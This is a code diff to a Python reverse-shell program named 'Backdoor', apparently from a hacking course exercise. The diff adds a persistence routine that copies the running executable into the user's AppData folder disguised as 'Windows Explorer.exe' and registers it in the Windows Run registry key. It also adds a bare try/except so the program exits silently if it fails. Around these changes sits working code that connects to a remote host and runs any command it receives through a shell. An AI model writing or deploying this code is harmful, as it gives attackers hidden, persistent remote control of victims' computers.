@@ -4,16 +4,26 @@ import json
 import os
 import base64
 import sys
+import shutil
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistant()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
         self.connection.send(json.dumps("\n[+] Connection Established.\n").encode())
 
     def execute_system_command(self, command):
         DEVNULL = open(os.devnull, "wb")
-        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL) #subprocess.DEVNULL will work in windows
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL) #subprocess.DEVNULL will work for python 3
+
+    # reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "C:/test.exe"
+    # This is specifically for windows systems
+    def become_persistant(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copy(sys.executable, evil_file_location) # for executable use, "sys.executable"; for python files, use "__file__"
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"')
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -71,7 +81,9 @@ class Backdoor:
             self.reliable_send(command_result)
 
 #class end
-
-my_backdoor = Backdoor("127.0.0.1", 4490)
-my_backdoor.run()
-my_backdoor.close_connection()
+try:
+    my_backdoor = Backdoor("127.0.0.1", 4490)
+    my_backdoor.run()
+    my_backdoor.close_connection()
+except:
+    sys.exit()
